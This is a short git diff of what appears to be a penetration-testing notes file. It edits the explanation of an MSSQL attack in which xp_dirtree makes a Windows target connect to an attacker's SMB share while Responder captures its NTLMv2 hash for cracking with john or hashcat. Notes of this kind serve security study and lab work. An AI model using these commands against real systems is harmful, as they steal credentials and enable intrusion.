@@ -244,9 +244,9 @@ From local Kali machine, set up a smbserver:
 From local Kali machine, set up a Responder listener:
 ```sudo responder -I tun0```\
 From the MSSQL console:
-```xp_dirtree "\\$LHOST\$SHARENAME"```
+```xp_dirtree "\\$LHOST\$SHARENAME"``` to connect and list the dir tree of the remote SMB Share
 
-The responder listener will capture the NTMLv2 hash of the Windows target machine -> can possibly crack this hash with ```john``` or ```hashcat```
+The responder listener will capture the NTMLv2 hash of the Windows target machine with this request -> can possibly crack this hash with ```john``` or ```hashcat```
 
 
 ## SQL Injection
